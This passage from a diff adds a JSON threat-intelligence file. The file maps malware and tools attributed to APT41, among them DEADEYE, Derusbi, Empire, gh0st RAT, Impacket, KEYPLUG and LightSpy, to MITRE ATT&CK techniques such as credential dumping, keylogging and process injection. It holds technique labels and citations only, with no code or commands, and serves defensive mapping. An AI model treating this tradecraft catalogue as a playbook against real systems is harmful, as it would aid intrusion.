+          "name": "Application Layer Protocol",
+          "sub_name": "Web Protocols"
+        },
+        {
+          "parent_id": "T1071",
+          "id": "002",
+          "name": "Application Layer Protocol",
+          "sub_name": "File Transfer Protocols"
+        },
+        {
+          "id": "T1197",
+          "name": "BITS Jobs"
+        },
+        {
+          "id": "T1185",
+          "name": "Browser Session Hijacking"
+        },
+        {
+          "parent_id": "T1059",
+          "id": "007",
+          "name": "Command and Scripting Interpreter",
+          "sub_name": "JavaScript"
+        },
+        {
+          "parent_id": "T1059",
+          "id": "005",
+          "name": "Command and Scripting Interpreter",
+          "sub_name": "Visual Basic"
+        },
+        {
+          "parent_id": "T1059",
+          "id": "001",
+          "name": "Command and Scripting Interpreter",
+          "sub_name": "PowerShell"
+        },
+        {
+          "parent_id": "T1059",
+          "id": "006",
+          "name": "Command and Scripting Interpreter",
+          "sub_name": "Python"
+        },
+        {
+          "parent_id": "T1059",
+          "id": "003",
+          "name": "Command and Scripting Interpreter",
+          "sub_name": "Windows Command Shell"
+        },
+        {
+          "parent_id": "T1543",
+          "id": "003",
+          "name": "Create or Modify System Process",
+          "sub_name": "Windows Service"
+        },
+        {
+          "parent_id": "T1132",
+          "id": "001",
+          "name": "Data Encoding",
+          "sub_name": "Standard Encoding"
+        },
+        {
+          "id": "T1005",
+          "name": "Data from Local System"
+        },
+        {
+          "parent_id": "T1001",
+          "id": "003",
+          "name": "Data Obfuscation",
+          "sub_name": "Protocol or Service Impersonation"
+        },
+        {
+          "id": "T1030",
+          "name": "Data Transfer Size Limits"
+        },
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files or Information"
+        },
+        {
+          "parent_id": "T1573",
+          "id": "002",
+          "name": "Encrypted Channel",
+          "sub_name": "Asymmetric Cryptography"
+        },
+        {
+          "parent_id": "T1573",
+          "id": "001",
+          "name": "Encrypted Channel",
+          "sub_name": "Symmetric Cryptography"
+        },
+        {
+          "id": "T1203",
+          "name": "Exploitation for Client Execution"
+        },
+        {
+          "id": "T1068",
+          "name": "Exploitation for Privilege Escalation"
+        },
+        {
+          "id": "T1083",
+          "name": "File and Directory Discovery"
+        },
+        {
+          "parent_id": "T1564",
+          "id": "010",
+          "name": "Hide Artifacts",
+          "sub_name": "Process Argument Spoofing"
+        },
+        {
+          "parent_id": "T1562",
+          "id": "001",
+          "name": "Impair Defenses",
+          "sub_name": "Disable or Modify Tools"
+        },
+        {
+          "parent_id": "T1070",
+          "id": "006",
+          "name": "Indicator Removal",
+          "sub_name": "Timestomp"
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "parent_id": "T1056",
+          "id": "001",
+          "name": "Input Capture",
+          "sub_name": "Keylogging"
+        },
+        {
+          "id": "T1112",
+          "name": "Modify Registry"
+        },
+        {
+          "id": "T1106",
+          "name": "Native API"
+        },
+        {
+          "id": "T1046",
+          "name": "Network Service Discovery"
+        },
+        {
+          "id": "T1135",
+          "name": "Network Share Discovery"
+        },
+        {
+          "id": "T1095",
+          "name": "Non-Application Layer Protocol"
+        },
+        {
+          "parent_id": "T1027",
+          "id": "005",
+          "name": "Obfuscated Files or Information",
+          "sub_name": "Indicator Removal from Tools"
+        },
+        {
+          "id": "T1027",
+          "name": "Obfuscated Files or Information"
+        },
+        {
+          "parent_id": "T1137",
+          "id": "001",
+          "name": "Office Application Startup",
+          "sub_name": "Office Template Macros"
+        },
+        {
+          "parent_id": "T1003",
+          "id": "001",
+          "name": "OS Credential Dumping",
+          "sub_name": "LSASS Memory"
+        },
+        {
+          "parent_id": "T1003",
+          "id": "002",
+          "name": "OS Credential Dumping",
+          "sub_name": "Security Account Manager"
+        },
+        {
+          "parent_id": "T1069",
+          "id": "002",
+          "name": "Permission Groups Discovery",
+          "sub_name": "Domain Groups"
+        },
+        {
+          "parent_id": "T1069",
+          "id": "001",
+          "name": "Permission Groups Discovery",
+          "sub_name": "Local Groups"
+        },
+        {
+          "id": "T1057",
+          "name": "Process Discovery"
+        },
+        {
+          "parent_id": "T1055",
+          "id": "001",
+          "name": "Process Injection",
+          "sub_name": "Dynamic-link Library Injection"
+        },
+        {
+          "parent_id": "T1055",
+          "id": "012",
+          "name": "Process Injection",
+          "sub_name": "Process Hollowing"
+        },
+        {
+          "id": "T1055",
+          "name": "Process Injection"
+        },
+        {
+          "id": "T1572",
+          "name": "Protocol Tunneling"
+        },
+        {
+          "parent_id": "T1090",
+          "id": "004",
+          "name": "Proxy",
+          "sub_name": "Domain Fronting"
+        },
+        {
+          "parent_id": "T1090",
+          "id": "001",
+          "name": "Proxy",
+          "sub_name": "Internal Proxy"
+        },
+        {
+          "id": "T1012",
+          "name": "Query Registry"
+        },
+        {
+          "id": "T1620",
+          "name": "Reflective Code Loading"
+        },
+        {
+          "parent_id": "T1021",
+          "id": "001",
+          "name": "Remote Services",
+          "sub_name": "Remote Desktop Protocol"
+        },
+        {
+          "parent_id": "T1021",
+          "id": "004",
+          "name": "Remote Services",
+          "sub_name": "SSH"
+        },
+        {
+          "parent_id": "T1021",
+          "id": "006",
+          "name": "Remote Services",
+          "sub_name": "Windows Remote Management"
+        },
+        {
+          "parent_id": "T1021",
+          "id": "002",
+          "name": "Remote Services",
+          "sub_name": "SMB/Windows Admin Shares"
+        },
+        {
+          "parent_id": "T1021",
+          "id": "003",
+          "name": "Remote Services",
+          "sub_name": "Distributed Component Object Model"
+        },
+        {
+          "id": "T1018",
+          "name": "Remote System Discovery"
+        },
+        {
+          "id": "T1029",
+          "name": "Scheduled Transfer"
+        },
+        {
+          "id": "T1113",
+          "name": "Screen Capture"
+        },
+        {
+          "id": "T1518",
+          "name": "Software Discovery"
+        },
+        {
+          "parent_id": "T1553",
+          "id": "002",
+          "name": "Subvert Trust Controls",
+          "sub_name": "Code Signing"
+        },
+        {
+          "parent_id": "T1218",
+          "id": "011",
+          "name": "System Binary Proxy Execution",
+          "sub_name": "Rundll32"
+        },
+        {
+          "id": "T1016",
+          "name": "System Network Configuration Discovery"
+        },
+        {
+          "id": "T1049",
+          "name": "System Network Connections Discovery"
+        },
+        {
+          "id": "T1007",
+          "name": "System Service Discovery"
+        },
+        {
+          "parent_id": "T1569",
+          "id": "002",
+          "name": "System Services",
+          "sub_name": "Service Execution"
+        },
+        {
+          "parent_id": "T1550",
+          "id": "002",
+          "name": "Use Alternate Authentication Material",
+          "sub_name": "Pass the Hash"
+        },
+        {
+          "parent_id": "T1078",
+          "id": "002",
+          "name": "Valid Accounts",
+          "sub_name": "Domain Accounts"
+        },
+        {
+          "parent_id": "T1078",
+          "id": "003",
+          "name": "Valid Accounts",
+          "sub_name": "Local Accounts"
+        },
+        {
+          "id": "T1047",
+          "name": "Windows Management Instrumentation"
+        }
+      ]
+    },
+    {
+      "id": "S1052",
+      "name": "DEADEYE",
+      "descr": "(Citation: Mandiant APT41)",
+      "techniques": [
+        {
+          "parent_id": "T1059",
+          "id": "003",
+          "name": "Command and Scripting Interpreter",
+          "sub_name": "Windows Command Shell"
+        },
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files or Information"
+        },
+        {
+          "id": "T1480",
+          "name": "Execution Guardrails"
+        },
+        {
+          "parent_id": "T1564",
+          "id": "004",
+          "name": "Hide Artifacts",
+          "sub_name": "NTFS File Attributes"
+        },
+        {
+          "parent_id": "T1036",
+          "id": "004",
+          "name": "Masquerading",
+          "sub_name": "Masquerade Task or Service"
+        },
+        {
+          "id": "T1106",
+          "name": "Native API"
+        },
+        {
+          "parent_id": "T1027",
+          "id": "013",
+          "name": "Obfuscated Files or Information",
+          "sub_name": "Encrypted/Encoded File"
+        },
+        {
+          "parent_id": "T1027",
+          "id": "009",
+          "name": "Obfuscated Files or Information",
+          "sub_name": "Embedded Payloads"
+        },
+        {
+          "id": "T1053",
+          "name": "Scheduled Task/Job"
+        },
+        {
+          "parent_id": "T1218",
+          "id": "007",
+          "name": "System Binary Proxy Execution",
+          "sub_name": "Msiexec"
+        },
+        {
+          "parent_id": "T1218",
+          "id": "011",
+          "name": "System Binary Proxy Execution",
+          "sub_name": "Rundll32"
+        },
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        },
+        {
+          "id": "T1016",
+          "name": "System Network Configuration Discovery"
+        }
+      ]
+    },
+    {
+      "id": "S0021",
+      "name": "Derusbi",
+      "descr": "(Citation: FireEye APT41 Aug 2019)",
+      "techniques": [
+        {
+          "id": "T1123",
+          "name": "Audio Capture"
+        },
+        {
+          "parent_id": "T1059",
+          "id": "004",
+          "name": "Command and Scripting Interpreter",
+          "sub_name": "Unix Shell"
+        },
+        {
+          "parent_id": "T1573",
+          "id": "001",
+          "name": "Encrypted Channel",
+          "sub_name": "Symmetric Cryptography"
+        },
+        {
+          "id": "T1008",
+          "name": "Fallback Channels"
+        },
+        {
+          "id": "T1083",
+          "name": "File and Directory Discovery"
+        },
+        {
+          "parent_id": "T1070",
+          "id": "006",
+          "name": "Indicator Removal",
+          "sub_name": "Timestomp"
+        },
+        {
+          "parent_id": "T1070",
+          "id": "004",
+          "name": "Indicator Removal",
+          "sub_name": "File Deletion"
+        },
+        {
+          "parent_id": "T1056",
+          "id": "001",
+          "name": "Input Capture",
+          "sub_name": "Keylogging"
+        },
+        {
+          "id": "T1095",
+          "name": "Non-Application Layer Protocol"
+        },
+        {
+          "id": "T1571",
+          "name": "Non-Standard Port"
+        },
+        {
+          "id": "T1057",
+          "name": "Process Discovery"
+        },
+        {
+          "parent_id": "T1055",
+          "id": "001",
+          "name": "Process Injection",
+          "sub_name": "Dynamic-link Library Injection"
+        },
+        {
+          "id": "T1012",
+          "name": "Query Registry"
+        },
+        {
+          "id": "T1113",
+          "name": "Screen Capture"
+        },
+        {
+          "parent_id": "T1218",
+          "id": "010",
+          "name": "System Binary Proxy Execution",
+          "sub_name": "Regsvr32"
+        },
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        },
+        {
+          "id": "T1033",
+          "name": "System Owner/User Discovery"
+        },
+        {
+          "id": "T1125",
+          "name": "Video Capture"
+        }
+      ]
+    },
+    {
+      "id": "S0105",
+      "name": "dsquery",
+      "descr": "(Citation: Mandiant APT41)",
+      "techniques": [
+        {
+          "parent_id": "T1087",
+          "id": "002",
+          "name": "Account Discovery",
+          "sub_name": "Domain Account"
+        },
+        {
+          "id": "T1482",
+          "name": "Domain Trust Discovery"
+        },
+        {
+          "parent_id": "T1069",
+          "id": "002",
+          "name": "Permission Groups Discovery",
+          "sub_name": "Domain Groups"
+        },
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        }
+      ]
+    },
+    {
+      "id": "S1158",
+      "name": "DUSTPAN",
+      "descr": "[DUSTPAN](https://attack.mitre.org/software/S1158) has been used by [APT41](https://attack.mitre.org/groups/G0096) in various campaigns since at least 2021.(Citation: Google Cloud APT41 2022)(Citation: Google Cloud APT41 2024)",
+      "techniques": [
+        {
+          "parent_id": "T1543",
+          "id": "003",
+          "name": "Create or Modify System Process",
+          "sub_name": "Windows Service"
+        },
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files or Information"
+        },
+        {
+          "parent_id": "T1036",
+          "id": "005",
+          "name": "Masquerading",
+          "sub_name": "Match Legitimate Resource Name or Location"
+        },
+        {
+          "parent_id": "T1027",
+          "id": "013",
+          "name": "Obfuscated Files or Information",
+          "sub_name": "Encrypted/Encoded File"
+        },
+        {
+          "parent_id": "T1027",
+          "id": "009",
+          "name": "Obfuscated Files or Information",
+          "sub_name": "Embedded Payloads"
+        },
+        {
+          "parent_id": "T1055",
+          "id": "002",
+          "name": "Process Injection",
+          "sub_name": "Portable Executable Injection"
+        }
+      ]
+    },
+    {
+      "id": "S1159",
+      "name": "DUSTTRAP",
+      "descr": "[DUSTTRAP](https://attack.mitre.org/software/S1159) is used by [APT41](https://attack.mitre.org/groups/G0096).(Citation: Google Cloud APT41 2024)",
+      "techniques": [
+        {
+          "parent_id": "T1087",
+          "id": "002",
+          "name": "Account Discovery",
+          "sub_name": "Domain Account"
+        },
+        {
+          "parent_id": "T1087",
+          "id": "001",
+          "name": "Account Discovery",
+          "sub_name": "Local Account"
+        },
+        {
+          "id": "T1010",
+          "name": "Application Window Discovery"
+        },
+        {
+          "parent_id": "T1059",
+          "id": "003",
+          "name": "Command and Scripting Interpreter",
+          "sub_name": "Windows Command Shell"
+        },
+        {
+          "id": "T1005",
+          "name": "Data from Local System"
+        },
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files or Information"
+        },
+        {
+          "id": "T1482",
+          "name": "Domain Trust Discovery"
+        },
+        {
+          "id": "T1041",
+          "name": "Exfiltration Over C2 Channel"
+        },
+        {
+          "id": "T1083",
+          "name": "File and Directory Discovery"
+        },
+        {
+          "id": "T1615",
+          "name": "Group Policy Discovery"
+        },
+        {
+          "id": "T1070",
+          "name": "Indicator Removal"
+        },
+        {
+          "parent_id": "T1070",
+          "id": "001",
+          "name": "Indicator Removal",
+          "sub_name": "Clear Windows Event Logs"
+        },
+        {
+          "parent_id": "T1070",
+          "id": "005",
+          "name": "Indicator Removal",
+          "sub_name": "Network Share Connection Removal"
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "parent_id": "T1056",
+          "id": "001",
+          "name": "Input Capture",
+          "sub_name": "Keylogging"
+        },
+        {
+          "id": "T1654",
+          "name": "Log Enumeration"
+        },
+        {
+          "id": "T1135",
+          "name": "Network Share Discovery"
+        },
+        {
+          "parent_id": "T1027",
+          "id": "013",
+          "name": "Obfuscated Files or Information",
+          "sub_name": "Encrypted/Encoded File"
+        },
+        {
+          "parent_id": "T1027",
+          "id": "009",
+          "name": "Obfuscated Files or Information",
+          "sub_name": "Embedded Payloads"
+        },
+        {
+          "id": "T1057",
+          "name": "Process Discovery"
+        },
+        {
+          "id": "T1055",
+          "name": "Process Injection"
+        },
+        {
+          "id": "T1012",
+          "name": "Query Registry"
+        },
+        {
+          "id": "T1018",
+          "name": "Remote System Discovery"
+        },
+        {
+          "id": "T1113",
+          "name": "Screen Capture"
+        },
+        {
+          "parent_id": "T1518",
+          "id": "001",
+          "name": "Software Discovery",
+          "sub_name": "Security Software Discovery"
+        },
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        },
+        {
+          "id": "T1016",
+          "name": "System Network Configuration Discovery"
+        },
+        {
+          "id": "T1124",
+          "name": "System Time Discovery"
+        },
+        {
+          "parent_id": "T1497",
+          "id": "001",
+          "name": "Virtualization/Sandbox Evasion",
+          "sub_name": "System Checks"
+        }
+      ]
+    },
+    {
+      "id": "S0363",
+      "name": "Empire",
+      "descr": "(Citation: Crowdstrike GTR2020 Mar 2020)",
+      "techniques": [
+        {
+          "parent_id": "T1548",
+          "id": "002",
+          "name": "Abuse Elevation Control Mechanism",
+          "sub_name": "Bypass User Account Control"
+        },
+        {
+          "parent_id": "T1134",
+          "id": "005",
+          "name": "Access Token Manipulation",
+          "sub_name": "SID-History Injection"
+        },
+        {
+          "id": "T1134",
+          "name": "Access Token Manipulation"
+        },
+        {
+          "parent_id": "T1134",
+          "id": "002",
+          "name": "Access Token Manipulation",
+          "sub_name": "Create Process with Token"
+        },
+        {
+          "parent_id": "T1087",
+          "id": "002",
+          "name": "Account Discovery",
+          "sub_name": "Domain Account"
+        },
+        {
+          "parent_id": "T1087",
+          "id": "001",
+          "name": "Account Discovery",
+          "sub_name": "Local Account"
+        },
+        {
+          "parent_id": "T1557",
+          "id": "001",
+          "name": "Adversary-in-the-Middle",
+          "sub_name": "LLMNR/NBT-NS Poisoning and SMB Relay"
+        },
+        {
+          "parent_id": "T1071",
+          "id": "001",
+          "name": "Application Layer Protocol",
+          "sub_name": "Web Protocols"
+        },
+        {
+          "id": "T1560",
+          "name": "Archive Collected Data"
+        },
+        {
+          "id": "T1119",
+          "name": "Automated Collection"
+        },
+        {
+          "id": "T1020",
+          "name": "Automated Exfiltration"
+        },
+        {
+          "parent_id": "T1547",
+          "id": "005",
+          "name": "Boot or Logon Autostart Execution",
+          "sub_name": "Security Support Provider"
+        },
+        {
+          "parent_id": "T1547",
+          "id": "001",
+          "name": "Boot or Logon Autostart Execution",
+          "sub_name": "Registry Run Keys / Startup Folder"
+        },
+        {
+          "parent_id": "T1547",
+          "id": "009",
+          "name": "Boot or Logon Autostart Execution",
+          "sub_name": "Shortcut Modification"
+        },
+        {
+          "id": "T1217",
+          "name": "Browser Information Discovery"
+        },
+        {
+          "id": "T1115",
+          "name": "Clipboard Data"
+        },
+        {
+          "parent_id": "T1059",
+          "id": "001",
+          "name": "Command and Scripting Interpreter",
+          "sub_name": "PowerShell"
+        },
+        {
+          "parent_id": "T1059",
+          "id": "003",
+          "name": "Command and Scripting Interpreter",
+          "sub_name": "Windows Command Shell"
+        },
+        {
+          "id": "T1059",
+          "name": "Command and Scripting Interpreter"
+        },
+        {
+          "parent_id": "T1136",
+          "id": "001",
+          "name": "Create Account",
+          "sub_name": "Local Account"
+        },
+        {
+          "parent_id": "T1136",
+          "id": "002",
+          "name": "Create Account",
+          "sub_name": "Domain Account"
+        },
+        {
+          "parent_id": "T1543",
+          "id": "003",
+          "name": "Create or Modify System Process",
+          "sub_name": "Windows Service"
+        },
+        {
+          "parent_id": "T1555",
+          "id": "003",
+          "name": "Credentials from Password Stores",
+          "sub_name": "Credentials from Web Browsers"
+        },
+        {
+          "parent_id": "T1484",
+          "id": "001",
+          "name": "Domain or Tenant Policy Modification",
+          "sub_name": "Group Policy Modification"
+        },
+        {
+          "id": "T1482",
+          "name": "Domain Trust Discovery"
+        },
+        {
+          "parent_id": "T1114",
+          "id": "001",
+          "name": "Email Collection",
+          "sub_name": "Local Email Collection"
+        },
+        {
+          "parent_id": "T1573",
+          "id": "002",
+          "name": "Encrypted Channel",
+          "sub_name": "Asymmetric Cryptography"
+        },
+        {
+          "parent_id": "T1546",
+          "id": "008",
+          "name": "Event Triggered Execution",
+          "sub_name": "Accessibility Features"
+        },
+        {
+          "id": "T1041",
+          "name": "Exfiltration Over C2 Channel"
+        },
+        {
+          "parent_id": "T1567",
+          "id": "001",
+          "name": "Exfiltration Over Web Service",
+          "sub_name": "Exfiltration to Code Repository"
+        },
+        {
+          "parent_id": "T1567",
+          "id": "002",
+          "name": "Exfiltration Over Web Service",
+          "sub_name": "Exfiltration to Cloud Storage"
+        },
+        {
+          "id": "T1068",
+          "name": "Exploitation for Privilege Escalation"
+        },
+        {
+          "id": "T1210",
+          "name": "Exploitation of Remote Services"
+        },
+        {
+          "id": "T1083",
+          "name": "File and Directory Discovery"
+        },
+        {
+          "id": "T1615",
+          "name": "Group Policy Discovery"
+        },
+        {
+          "parent_id": "T1574",
+          "id": "009",
+          "name": "Hijack Execution Flow",
+          "sub_name": "Path Interception by Unquoted Path"
+        },
+        {
+          "parent_id": "T1574",
+          "id": "008",
+          "name": "Hijack Execution Flow",
+          "sub_name": "Path Interception by Search Order Hijacking"
+        },
+        {
+          "parent_id": "T1574",
+          "id": "007",
+          "name": "Hijack Execution Flow",
+          "sub_name": "Path Interception by PATH Environment Variable"
+        },
+        {
+          "parent_id": "T1574",
+          "id": "004",
+          "name": "Hijack Execution Flow",
+          "sub_name": "Dylib Hijacking"
+        },
+        {
+          "parent_id": "T1574",
+          "id": "001",
+          "name": "Hijack Execution Flow",
+          "sub_name": "DLL"
+        },
+        {
+          "parent_id": "T1070",
+          "id": "006",
+          "name": "Indicator Removal",
+          "sub_name": "Timestomp"
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "parent_id": "T1056",
+          "id": "001",
+          "name": "Input Capture",
+          "sub_name": "Keylogging"
+        },
+        {
+          "parent_id": "T1056",
+          "id": "004",
+          "name": "Input Capture",
+          "sub_name": "Credential API Hooking"
+        },
+        {
+          "id": "T1106",
+          "name": "Native API"
+        },
+        {
+          "id": "T1046",
+          "name": "Network Service Discovery"
+        },
+        {
+          "id": "T1135",
+          "name": "Network Share Discovery"
+        },
+        {
+          "id": "T1040",
+          "name": "Network Sniffing"
+        },
+        {
+          "parent_id": "T1027",
+          "id": "010",
+          "name": "Obfuscated Files or Information",
+          "sub_name": "Command Obfuscation"
+        },
+        {
+          "parent_id": "T1003",
+          "id": "001",
+          "name": "OS Credential Dumping",
+          "sub_name": "LSASS Memory"
+        },
+        {
+          "id": "T1057",
+          "name": "Process Discovery"
+        },
+        {
+          "id": "T1055",
+          "name": "Process Injection"
+        },
+        {
+          "parent_id": "T1021",
+          "id": "003",
+          "name": "Remote Services",
+          "sub_name": "Distributed Component Object Model"
+        },
+        {
+          "parent_id": "T1021",
+          "id": "004",
+          "name": "Remote Services",
+          "sub_name": "SSH"
+        },
+        {
+          "parent_id": "T1053",
+          "id": "005",
+          "name": "Scheduled Task/Job",
+          "sub_name": "Scheduled Task"
+        },
+        {
+          "id": "T1113",
+          "name": "Screen Capture"
+        },
+        {
+          "parent_id": "T1518",
+          "id": "001",
+          "name": "Software Discovery",
+          "sub_name": "Security Software Discovery"
+        },
+        {
+          "parent_id": "T1558",
+          "id": "003",
+          "name": "Steal or Forge Kerberos Tickets",
+          "sub_name": "Kerberoasting"
+        },
+        {
+          "parent_id": "T1558",
+          "id": "001",
+          "name": "Steal or Forge Kerberos Tickets",
+          "sub_name": "Golden Ticket"
+        },
+        {
+          "parent_id": "T1558",
+          "id": "002",
+          "name": "Steal or Forge Kerberos Tickets",
+          "sub_name": "Silver Ticket"
+        },
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        },
+        {
+          "id": "T1016",
+          "name": "System Network Configuration Discovery"
+        },
+        {
+          "id": "T1049",
+          "name": "System Network Connections Discovery"
+        },
+        {
+          "id": "T1033",
+          "name": "System Owner/User Discovery"
+        },
+        {
+          "parent_id": "T1569",
+          "id": "002",
+          "name": "System Services",
+          "sub_name": "Service Execution"
+        },
+        {
+          "parent_id": "T1127",
+          "id": "001",
+          "name": "Trusted Developer Utilities Proxy Execution",
+          "sub_name": "MSBuild"
+        },
+        {
+          "parent_id": "T1552",
+          "id": "001",
+          "name": "Unsecured Credentials",
+          "sub_name": "Credentials In Files"
+        },
+        {
+          "parent_id": "T1552",
+          "id": "004",
+          "name": "Unsecured Credentials",
+          "sub_name": "Private Keys"
+        },
+        {
+          "parent_id": "T1550",
+          "id": "002",
+          "name": "Use Alternate Authentication Material",
+          "sub_name": "Pass the Hash"
+        },
+        {
+          "id": "T1125",
+          "name": "Video Capture"
+        },
+        {
+          "parent_id": "T1102",
+          "id": "002",
+          "name": "Web Service",
+          "sub_name": "Bidirectional Communication"
+        },
+        {
+          "id": "T1047",
+          "name": "Windows Management Instrumentation"
+        }
+      ]
+    },
+    {
+      "id": "S0095",
+      "name": "ftp",
+      "descr": "(Citation: FireEye APT41 March 2020)",
+      "techniques": [
+        {
+          "parent_id": "T1048",
+          "id": "003",
+          "name": "Exfiltration Over Alternative Protocol",
+          "sub_name": "Exfiltration Over Unencrypted Non-C2 Protocol"
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "id": "T1570",
+          "name": "Lateral Tool Transfer"
+        }
+      ]
+    },
+    {
+      "id": "S0032",
+      "name": "gh0st RAT",
+      "descr": "(Citation: FireEye APT41 Aug 2019)",
+      "techniques": [
+        {
+          "parent_id": "T1547",
+          "id": "001",
+          "name": "Boot or Logon Autostart Execution",
+          "sub_name": "Registry Run Keys / Startup Folder"
+        },
+        {
+          "id": "T1059",
+          "name": "Command and Scripting Interpreter"
+        },
+        {
+          "parent_id": "T1543",
+          "id": "003",
+          "name": "Create or Modify System Process",
+          "sub_name": "Windows Service"
+        },
+        {
+          "parent_id": "T1132",
+          "id": "001",
+          "name": "Data Encoding",
+          "sub_name": "Standard Encoding"
+        },
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files or Information"
+        },
+        {
+          "parent_id": "T1568",
+          "id": "001",
+          "name": "Dynamic Resolution",
+          "sub_name": "Fast Flux DNS"
+        },
+        {
+          "parent_id": "T1573",
+          "id": "001",
+          "name": "Encrypted Channel",
+          "sub_name": "Symmetric Cryptography"
+        },
+        {
+          "id": "T1573",
+          "name": "Encrypted Channel"
+        },
+        {
+          "parent_id": "T1574",
+          "id": "001",
+          "name": "Hijack Execution Flow",
+          "sub_name": "DLL"
+        },
+        {
+          "parent_id": "T1070",
+          "id": "001",
+          "name": "Indicator Removal",
+          "sub_name": "Clear Windows Event Logs"
+        },
+        {
+          "parent_id": "T1070",
+          "id": "004",
+          "name": "Indicator Removal",
+          "sub_name": "File Deletion"
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "parent_id": "T1056",
+          "id": "001",
+          "name": "Input Capture",
+          "sub_name": "Keylogging"
+        },
+        {
+          "id": "T1112",
+          "name": "Modify Registry"
+        },
+        {
+          "id": "T1106",
+          "name": "Native API"
+        },
+        {
+          "id": "T1095",
+          "name": "Non-Application Layer Protocol"
+        },
+        {
+          "id": "T1057",
+          "name": "Process Discovery"
+        },
+        {
+          "id": "T1055",
+          "name": "Process Injection"
+        },
+        {
+          "id": "T1012",
+          "name": "Query Registry"
+        },
+        {
+          "id": "T1113",
+          "name": "Screen Capture"
+        },
+        {
+          "id": "T1129",
+          "name": "Shared Modules"
+        },
+        {
+          "parent_id": "T1218",
+          "id": "011",
+          "name": "System Binary Proxy Execution",
+          "sub_name": "Rundll32"
+        },
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        },
+        {
+          "parent_id": "T1569",
+          "id": "002",
+          "name": "System Services",
+          "sub_name": "Service Execution"
+        }
+      ]
+    },
+    {
+      "id": "S0357",
+      "name": "Impacket",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) used [Impacket](https://attack.mitre.org/software/S0357) to dump LSA secrets on one of the domain controllers in the victim network.(Citation: apt41_dcsocytec_dec2022)",
+      "techniques": [
+        {
+          "parent_id": "T1557",
+          "id": "001",
+          "name": "Adversary-in-the-Middle",
+          "sub_name": "LLMNR/NBT-NS Poisoning and SMB Relay"
+        },
+        {
+          "id": "T1570",
+          "name": "Lateral Tool Transfer"
+        },
+        {
+          "id": "T1040",
+          "name": "Network Sniffing"
+        },
+        {
+          "parent_id": "T1003",
+          "id": "003",
+          "name": "OS Credential Dumping",
+          "sub_name": "NTDS"
+        },
+        {
+          "parent_id": "T1003",
+          "id": "001",
+          "name": "OS Credential Dumping",
+          "sub_name": "LSASS Memory"
+        },
+        {
+          "parent_id": "T1003",
+          "id": "002",
+          "name": "OS Credential Dumping",
+          "sub_name": "Security Account Manager"
+        },
+        {
+          "parent_id": "T1003",
+          "id": "004",
+          "name": "OS Credential Dumping",
+          "sub_name": "LSA Secrets"
+        },
+        {
+          "parent_id": "T1558",
+          "id": "003",
+          "name": "Steal or Forge Kerberos Tickets",
+          "sub_name": "Kerberoasting"
+        },
+        {
+          "parent_id": "T1558",
+          "id": "005",
+          "name": "Steal or Forge Kerberos Tickets",
+          "sub_name": "Ccache Files"
+        },
+        {
+          "parent_id": "T1569",
+          "id": "002",
+          "name": "System Services",
+          "sub_name": "Service Execution"
+        },
+        {
+          "id": "T1047",
+          "name": "Windows Management Instrumentation"
+        }
+      ]
+    },
+    {
+      "id": "S0100",
+      "name": "ipconfig",
+      "descr": "(Citation: Group IB APT 41 June 2021)",
+      "techniques": [
+        {
+          "id": "T1016",
+          "name": "System Network Configuration Discovery"
+        }
+      ]
+    },
+    {
+      "id": "S1051",
+      "name": "KEYPLUG",
+      "descr": "(Citation: Mandiant APT41)",
+      "techniques": [
+        {
+          "parent_id": "T1071",
+          "id": "001",
+          "name": "Application Layer Protocol",
+          "sub_name": "Web Protocols"
+        },
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files or Information"
+        },
+        {
+          "parent_id": "T1573",
+          "id": "002",
+          "name": "Encrypted Channel",
+          "sub_name": "Asymmetric Cryptography"
+        },
+        {
+          "id": "T1095",
+          "name": "Non-Application Layer Protocol"
+        },
+        {
+          "parent_id": "T1027",
+          "id": "013",
+          "name": "Obfuscated Files or Information",
+          "sub_name": "Encrypted/Encoded File"
+        },
+        {
+          "id": "T1090",
+          "name": "Proxy"
+        },
+        {
+          "id": "T1124",
+          "name": "System Time Discovery"
+        },
+        {
+          "parent_id": "T1102",
+          "id": "001",
+          "name": "Web Service",
+          "sub_name": "Dead Drop Resolver"
+        }
+      ]
+    },
+    {
+      "id": "S1185",
+      "name": "LightSpy",
+      "descr": "(Citation: MelikovBlackBerry LightSpy 2024)",
+      "techniques": [
+        {
+          "parent_id": "T1071",
+          "id": "001",
+          "name": "Application Layer Protocol",
+          "sub_name": "Web Protocols"
+        },
+        {
+          "parent_id": "T1437",
+          "id": "001",
+          "name": "Application Layer Protocol",
+          "sub_name": "Web Protocols"
+        },
+        {
+          "id": "T1532",
+          "name": "Archive Collected Data"
+        },
+        {
+          "id": "T1123",
+          "name": "Audio Capture"
+        },
+        {
+          "id": "T1429",
+          "name": "Audio Capture"
+        },
+        {
+          "id": "T1398",
+          "name": "Boot or Logon Initialization Scripts"
+        },
+        {
+          "id": "T1217",
+          "name": "Browser Information Discovery"
+        },
+        {
+          "id": "T1623",
+          "name": "Command and Scripting Interpreter"
+        },
+        {
+          "parent_id": "T1634",
+          "id": "001",
+          "name": "Credentials from Password Store",
+          "sub_name": "Keychain"
+        },
+        {
+          "parent_id": "T1555",
+          "id": "001",
+          "name": "Credentials from Password Stores",
+          "sub_name": "Keychain"
+        },
+        {
+          "id": "T1662",
+          "name": "Data Destruction"
+        },
+        {
+          "id": "T1533",
+          "name": "Data from Local System"
+        },
+        {
+          "id": "T1456",
+          "name": "Drive-By Compromise"
+        },
+        {
+          "id": "T1642",
